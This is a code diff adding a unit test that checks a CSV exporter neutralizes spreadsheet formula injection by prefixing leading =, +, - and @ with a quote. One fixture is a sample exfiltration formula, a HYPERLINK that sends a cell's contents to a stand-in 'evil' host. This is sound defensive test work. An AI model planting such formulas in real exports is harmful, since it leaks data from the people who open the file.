@@ -91,6 +91,25 @@ describe("toCsv (RFC-4180)", () => {
     const csv = toCsv([{ key: "a", label: "A" }], [{ a: '"' }]);
     assert.equal(csv, 'A\r\n""""');
   });
+
+  it("neutralizes spreadsheet formula injection (leading = + - @)", () => {
+    const columns = [{ key: "name", label: "Name" }];
+    // A resource/asset named with a leading '=' must not execute as a formula.
+    const csv = toCsv(columns, [
+      { name: '=HYPERLINK("http://evil/?x="&A1,"click")' },
+      { name: "+1+2" },
+      { name: "-cmd" },
+      { name: "@SUM(A1)" },
+      { name: "safe-value" },
+    ]);
+    const lines = csv.split("\r\n");
+    // Prefixed with a single quote, and still RFC-4180 quoted because it contains a comma.
+    assert.match(lines[1], /^"'=HYPERLINK/u);
+    assert.equal(lines[2], "'+1+2");
+    assert.equal(lines[3], "'-cmd");
+    assert.equal(lines[4], "'@SUM(A1)");
+    assert.equal(lines[5], "safe-value");
+  });
 });
 
 describe("buildReport — cmdb-resources dataset (reuses runCmdbQuery)", () => {
